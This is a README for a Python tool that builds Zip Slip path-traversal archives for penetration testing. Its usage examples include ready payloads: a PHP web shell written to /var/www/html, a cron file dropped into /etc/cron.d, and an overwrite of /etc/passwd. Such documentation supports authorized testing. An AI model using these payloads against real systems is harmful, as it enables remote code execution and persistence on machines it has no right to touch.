# s31zipslip - Zip Slip Vulnerability Archive Creator

![Python](https://img.shields.io/badge/Python-3.6%2B-blue)
![License](https://img.shields.io/badge/License-MIT-green)
![Security](https://img.shields.io/badge/Security-Testing-orange)

A powerful tool for creating archives with Zip Slip vulnerability for authorized security testing and penetration testing purposes.

## 📖 About

s31zipslip is a Python utility designed to create archive files (ZIP, JAR, TAR, etc.) containing specially crafted paths that demonstrate the Zip Slip vulnerability (CVE-2018-1002200). This tool helps security professionals test their applications against directory traversal attacks through archive extraction.

## ⚠️ Important Warning

**This tool is for educational and authorized security testing purposes only.**
- Use only on systems you own or have explicit permission to test
- Never use this tool for illegal or malicious activities
- The author is not responsible for any misuse of this tool

## 🚀 Features

- Support for multiple archive formats: ZIP, JAR, TAR, TAR.GZ, TAR.BZ2
- Customizable target paths and filenames
- Flexible file content specification
- Clean and intuitive command-line interface
- Comprehensive error handling

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/s31zipslip.git
cd s31zipslip

# Or download the script directly
wget https://raw.githubusercontent.com/yourusername/s31zipslip/main/s31zipslip.py
```

## 🛠️ Requirements

- Python 3.6+
- No external dependencies (uses standard library modules)

## 📋 Usage

### Basic Syntax
```bash
python3 s31zipslip.py -d TARGET_DIRECTORY -f FILENAME -o OUTPUT_FILE [-c CONTENT]
```

### Options
| Flag | Description | Example |
|------|-------------|---------|
| `-d, --directory` | Target directory path for Zip Slip | `../../../../../../../tmp/` |
| `-f, --filename` | Filename to create inside the archive | `test.txt` |
| `-o, --output` | Output archive filename | `exploit.zip` |
| `-c, --content` | File content (optional) | `"Malicious content"` |

### Examples

**Create a basic test archive:**
```bash
python3 s31zipslip.py -d '../../../../../../../tmp/a/' -f test.txt -o test.zip
```

**Create a TAR.GZ archive targeting cron directory:**
```bash
python3 s31zipslip.py -d '../../../../../../../etc/cron.d/' -f malicious.cron -o payload.tar.gz
```

**Create a JAR archive with PHP shell content:**
```bash
python3 s31zipslip.py -d '../../../../../../../var/www/html/' -f shell.php -o exploit.jar -c '<?php system($_GET["cmd"]); ?>'
```

**Create a TAR archive with custom content:**
```bash
python3 s31zipslip.py -d '../../../../../../../etc/passwd' -f shadow -o backup.tar -c 'root:x:0:0:root:/root:/bin/bash'
```

## 🎯 Supported Archive Formats

- **ZIP** (.zip)
- **JAR** (.jar) 
- **TAR** (.tar)
- **TAR.GZ** (.tar.gz, .tgz)
- **TAR.BZ2** (.tar.bz2)

## 🔍 How It Works

The tool creates archives containing files with malicious paths that include directory traversal sequences (`../`). When vulnerable applications extract these archives without proper path sanitization, the files can be written to unexpected locations outside the intended extraction directory.

## 🛡️ Protection Against Zip Slip

To protect your applications:
- Always validate and sanitize file paths during archive extraction
- Use canonical paths to resolve relative paths
- Extract files to a secure temporary directory
- Implement proper access controls

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 🐛 Reporting Issues

If you find any bugs or have suggestions, please open an issue on GitHub.

## 📚 References

- [Zip Slip Vulnerability](https://github.com/snyk/zip-slip-vulnerability)
- [CVE-2018-1002200](https://nvd.nist.gov/vuln/detail/CVE-2018-1002200)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
